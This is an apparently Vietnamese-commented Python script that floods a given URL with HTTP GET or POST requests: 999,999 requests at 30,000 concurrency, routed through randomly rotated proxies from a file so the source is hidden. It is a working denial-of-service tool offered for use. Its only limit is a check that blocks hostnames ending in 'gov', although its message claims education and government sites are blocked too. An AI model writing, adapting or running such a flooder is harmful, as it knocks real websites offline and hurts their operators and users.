#!C:\Users\win 10\AppData\Local\Programs\Python\Python311\python.exe
import asyncio
import aiohttp
import random
import sys
from urllib.parse import urlparse

# ==========================
# CHECK ARGS
# ==========================
if len(sys.argv) != 3:
    print("❌ Sai cú pháp!")
    print("Cách dùng đúng:")
    print("python tool.py <url> <GET|POST>")
    exit()

TARGET = sys.argv[1].strip()
METHOD = sys.argv[2].upper().strip()

if METHOD not in ["GET", "POST"]:
    print("❌ Method phải là GET hoặc POST!")
    exit()


# ==========================
# LIST DOMAIN CẤM
# ==========================
FORBIDDEN_DOMAINS = [
    "gov"
]


# ==========================
# CHECK DOMAIN
# ==========================
def is_forbidden(url):
    try:
        hostname = urlparse(url).hostname.lower()
        for d in FORBIDDEN_DOMAINS:
            if hostname.endswith(d):
                return True
        return False
    except:
        return True


if is_forbidden(TARGET):
    print("❌ Không được phép test GOV / EDU / CHINHPHU.VN")
    exit()


# ==========================
# CONFIG
# ==========================
CONCURRENCY = 30000
TOTAL = 999999
RPS = 2000000
INTERVAL = 10 / RPS

last_time = 0


# ==========================
# LOAD PROXIES
# ==========================
proxies = []
try:
    with open("proxies.txt") as f:
        proxies = [x.strip() for x in f if x.strip()]
        print(f"🔌 Loaded {len(proxies)} proxy")
except:
    print("⚠ Không tìm thấy proxies.txt (không dùng proxy)")


semaphore = asyncio.Semaphore(CONCURRENCY)


# ==========================
# PROXY FORMAT
# ==========================
def build(proxy_raw):
    p = proxy_raw.split(":")
    if len(p) == 4:  # host:port:user:pass
        host, port, user, pwd = p
        return f"http://{user}:{pwd}@{host}:{port}", aiohttp.BasicAuth(user, pwd)
    elif len(p) == 2:  # host:port
        host, port = p
        return f"http://{host}:{port}", None
    return None, None


# ==========================
# LOG ĐẸP
# ==========================
def pretty_log(idx, status, proxy_raw, error=None):
    if error:
        print(f"[{idx:4}] ERROR : {error:<25} | Proxy: {proxy_raw}")
    else:
        status_str = str(status) if status is not None else "N/A"
        print(f"[{idx:4}] Status: {status_str:<3}           | Proxy: {proxy_raw}")


# ==========================
# REQUEST
# ==========================
async def fetch(session, i):
    async with semaphore:
        proxy_raw = random.choice(proxies) if proxies else None
        proxy_url, auth = build(proxy_raw) if proxy_raw else (None, None)

        try:
            if METHOD == "GET":
                resp = await session.get(
                    TARGET,
                    timeout=5,
                    proxy=proxy_url,
                    proxy_auth=auth
                )
            else:
                resp = await session.post(
                    TARGET,
                    json={"ping": "test"},
                    timeout=5,
                    proxy=proxy_url,
                    proxy_auth=auth
                )

            pretty_log(i, resp.status, proxy_raw)

        except Exception as e:
            pretty_log(i, None, proxy_raw, error=str(e))


# ==========================
# MAIN
# ==========================
async def runner():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, i) for i in range(1, TOTAL + 1)]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(runner())
